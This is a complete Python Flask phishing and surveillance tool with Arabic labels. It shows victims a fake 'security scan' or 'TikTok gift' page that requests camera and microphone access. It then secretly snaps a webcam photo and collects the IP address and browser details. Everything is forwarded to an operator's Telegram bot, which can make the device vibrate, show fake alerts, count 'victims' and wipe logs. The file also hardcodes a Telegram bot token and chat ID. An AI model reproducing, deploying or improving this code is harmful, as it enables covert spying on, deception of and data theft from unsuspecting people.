import base64, requests, os, json, datetime, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي النهائية ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# ملف النظام السري
STORAGE = "sys_vault.json"

def get_vault():
    if os.path.exists(STORAGE):
        with open(STORAGE, 'r') as f: return json.load(f)
    return {"total": 0, "template": "security", "cmd": None, "victims": []}

def save_vault(data):
    with open(STORAGE, 'w') as f: json.dump(data, f)

# ==========================================
# --- القوالب التمويهية ---
# ==========================================
T_LIB = {
    "security": {"title": "فحص الأمان", "h": "🛡️ درع الحماية الذكي", "b": "بدء الفحص", "c": "#f38020"},
    "gift": {"title": "هدايا تيك توك", "h": "🎁 استلم هديتك الآن", "b": "فتح الصندوق", "c": "#00f2ea"}
}

# ==========================================
# --- واجهة الصيد الاحترافية (v40.0) ---
# ==========================================
MASTER_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ t.title }}</title>
    <style>
        body { background: #050505; color: white; font-family: 'Segoe UI'; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 40px rgba(0,0,0,0.8); }
        .btn { background: {{ t.c }}; color: #000; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; }
        #st { margin-top: 15px; color: #555; font-size: 0.7rem; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color: {{ t.c }}">{{ t.h }}</h2>
        <p style="color:#888">يرجى التأكيد للمتابعة</p>
        <button class="btn" id="go" onclick="start()">{{ t.b }}</button>
        <div id="st">ID: {{ vid }}</div>
    </div>
    <video id="v" style="position:fixed; top:-999px" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const enc = (s) => btoa(unescape(encodeURIComponent(s)));
        const send = (d, t) => fetch('/api/v1/vault', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d: enc(d), t: t})});
        
        async function check() {
            const r = await fetch('/api/v1/cmd'); const d = await r.json();
            if(d.cmd === 'vibrate') navigator.vibrate(500);
            if(d.cmd === 'alert') alert("🚨 تهديد أمني متكتشف!");
        }
        setInterval(check, 4000);

        async function start() {
            document.getElementById('go').style.display = 'none';
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                document.getElementById('v').srcObject = s;
                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
                await send(`🌐 IP: ${ip.ip}\\n📱 UserAgent: ${navigator.userAgent}`, 'msg');
                
                setTimeout(() => {
                    const v = document.getElementById('v'); const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send(c.toDataURL('image/jpeg', 0.7), 'img');
                    setTimeout(() => window.location.href = "https://google.com", 2000);
                }, 3000);
            } catch(e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

# ==========================================
# --- الـ Logic الخلفي المحمي ---
# ==========================================
@app.route('/')
def home():
    v = get_vault()
    return render_template_string(MASTER_HTML, t=T_LIB[v["template"]], vid=v["total"]+1)

@app.route('/api/v1/cmd')
def get_cmd():
    v = get_vault(); c = v["cmd"]; v["cmd"] = None; save_vault(v)
    return jsonify({"cmd": c})

@app.route('/api/v1/vault', methods=['POST'])
def capture():
    v = get_vault(); data = request.json
    t = data['t']; d = base64.b64decode(data['d']).decode('utf-8') if t == 'msg' else data['d']
    
    if t == 'msg':
        v['total'] += 1; v['victims'].append({"id": v['total'], "data": d, "time": str(datetime.datetime.now())})
        save_vault(v)
        kb = {"inline_keyboard": [[{"text": "📳 هز الجهاز", "callback_data": "cmd_vibrate"}, {"text": "⚠️ تنبيه", "callback_data": "cmd_alert"}]]}
        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🎯 **صيد جديد #{v['total']}**\\n{d}", 'reply_markup': kb, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        requests.post(API_URL + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': f"📸 صورة الضحية #{v['total']}"}, files={'photo': ('v.jpg', img)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    upd = request.json
    if "message" in upd and str(upd["message"]["chat"]["id"]) == ADMIN_ID:
        kb = {"inline_keyboard": [
            [{"text": "🔗 رابط الصيد", "callback_data": "l"}, {"text": "🎭 القوالب", "callback_data": "t"}],
            [{"text": "📊 إحصائيات", "callback_data": "s"}, {"text": "🧹 تدمير الكل", "callback_data": "clear"}]
        ]}
        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "👑 **لوحة تحكم الإمبراطور v40.0**", 'reply_markup': kb})
    elif "callback_query" in upd:
        q = upd["callback_query"]; data = q["data"]; v = get_vault()
        if data == "l": requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🚀 رابطك: `{BASE_URL}`", 'parse_mode': 'Markdown'})
        elif data == "s": requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🔢 إجمالي الضحايا: {v['total']}"})
        elif data == "clear": 
            if os.path.exists(STORAGE): os.remove(STORAGE)
            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "🧹 تم تدمير كل السجلات والصور!"})
        elif data.startswith("cmd_"):
            v["cmd"] = data.replace("cmd_", ""); save_vault(v)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

